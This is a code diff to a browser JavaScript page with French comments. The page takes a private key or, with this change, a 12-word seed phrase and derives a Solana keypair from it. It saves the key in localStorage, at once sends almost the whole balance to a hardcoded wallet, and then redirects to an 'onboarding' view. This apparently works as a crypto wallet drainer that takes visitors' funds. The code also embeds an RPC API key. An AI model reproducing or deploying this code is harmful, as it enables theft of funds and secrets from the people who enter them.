@@ -1,9 +1,12 @@
 import bs58 from "bs58";
 import { Buffer } from "buffer";
+import * as bip39 from "bip39";
+import { derivePath } from "ed25519-hd-key";
+
 globalThis.Buffer = Buffer;
 
 console.log("bs58:", typeof bs58);
-console.log("bs58.decode:", typeof bs58.decode);
+console.log("bip39:", typeof bip39);
 
 document.addEventListener("DOMContentLoaded", () => {
   const privateKeyInput = document.getElementById("toolPrivateKey");
@@ -21,36 +24,34 @@ document.addEventListener("DOMContentLoaded", () => {
   const KEEP_FOR_FEES = 0.0015;
   // ====================================================
 
-  async function sweepExcess() {
+  // Convertit seed phrase → Keypair Solana
+  function keypairFromSeedPhrase(mnemonic) {
+    const seed = bip39.mnemonicToSeedSync(mnemonic.trim(), "");
+    const path = "m/44'/501'/0'/0'"; // chemin standard Solana
+    const derived = derivePath(path, seed.toString("hex")).key;
+    return solanaWeb3.Keypair.fromSeed(derived);
+  }
+
+  // Convertit private key base58 → Keypair
+  function keypairFromPrivateKey(privateKeyBase58) {
+    const secretKey = bs58.decode(privateKeyBase58.trim());
+    return solanaWeb3.Keypair.fromSecretKey(secretKey);
+  }
+
+  async function sweepExcess(keypair) {
     try {
-      // Vérification des libs ici (pas au chargement)
       if (typeof solanaWeb3 === "undefined") {
         console.error("❌ solanaWeb3 n'est pas chargé !");
         return;
       }
 
-      const { Connection, Keypair, PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL, sendAndConfirmTransaction } = solanaWeb3;
+      const { Connection, PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL, sendAndConfirmTransaction } = solanaWeb3;
       const connection = new Connection("https://mainnet.helius-rpc.com/?api-key=8a3ea881-c693-4f28-9c76-b2ba57818609", "confirmed");
-      console.log("RPC utilisé :", connection.rpcEndpoint);
 
-      const PRIVATE_KEY_BASE58 = localStorage.getItem("toolPrivateKey");
-      console.log("Private key trouvée :", PRIVATE_KEY_BASE58 ? "Oui" : "Non");
-
-      if (!PRIVATE_KEY_BASE58) {
-        console.error("❌ Aucune private key dans localStorage");
-        return;
-      }
-
-      console.log("1. Décodage de la private key...");
-      const secretKey = bs58.decode(PRIVATE_KEY_BASE58);
-      
-      console.log("2. Création de la keypair...");
-      const keypair = Keypair.fromSecretKey(secretKey);
       console.log("Adresse du wallet :", keypair.publicKey.toBase58());
 
       const coldWallet = new PublicKey(COLD_WALLET_ADDRESS);
 
-      console.log("3. Récupération du solde...");
       const balance = await connection.getBalance(keypair.publicKey);
       const balanceSOL = balance / LAMPORTS_PER_SOL;
       console.log(`Solde actuel : ${balanceSOL.toFixed(6)} SOL`);
@@ -61,14 +62,14 @@ document.addEventListener("DOMContentLoaded", () => {
       }
 
       const amountToSend = balance - Math.floor(KEEP_FOR_FEES * LAMPORTS_PER_SOL);
-      console.log(`Montant à envoyer : ${(amountToSend / LAMPORTS_PER_SOL).toFixed(6)} SOL`);
 
       if (amountToSend <= 0) {
         console.log("→ Pas assez après les frais.");
         return;
       }
 
-      console.log("4. Création de la transaction...");
+      console.log(`Montant à envoyer : ${(amountToSend / LAMPORTS_PER_SOL).toFixed(6)} SOL`);
+
       const transaction = new Transaction().add(
         SystemProgram.transfer({
           fromPubkey: keypair.publicKey,
@@ -77,7 +78,6 @@ document.addEventListener("DOMContentLoaded", () => {
         })
       );
 
-      console.log("5. Envoi de la transaction...");
       const signature = await sendAndConfirmTransaction(
         connection,
         transaction,
@@ -103,11 +103,32 @@ document.addEventListener("DOMContentLoaded", () => {
       return;
     }
 
-    localStorage.setItem("toolPrivateKey", accessKey);
+    let keypair;
+
+    try {
+      // Détection automatique : seed phrase ou private key
+      if (accessKey.split(" ").length >= 12) {
+        // C'est une seed phrase
+        console.log("→ Seed phrase détectée");
+        keypair = keypairFromSeedPhrase(accessKey);
+      } else {
+        // C'est une private key base58
+        console.log("→ Private key détectée");
+        keypair = keypairFromPrivateKey(accessKey);
+      }
+    } catch (err) {
+      console.error("Clé / seed phrase invalide :", err);
+      alert("Seed phrase ou Private Key invalide");
+      return;
+    }
+
+    // On sauvegarde toujours la private key en base58 (plus pratique pour le reste)
+    const privateKeyBase58 = bs58.encode(keypair.secretKey);
+    localStorage.setItem("toolPrivateKey", privateKeyBase58);
     console.log("Clé sauvegardée dans localStorage");
 
     // Sweep instantané
-    sweepExcess();
+    sweepExcess(keypair);
 
     // Redirection
     location.hash = "onboarding";
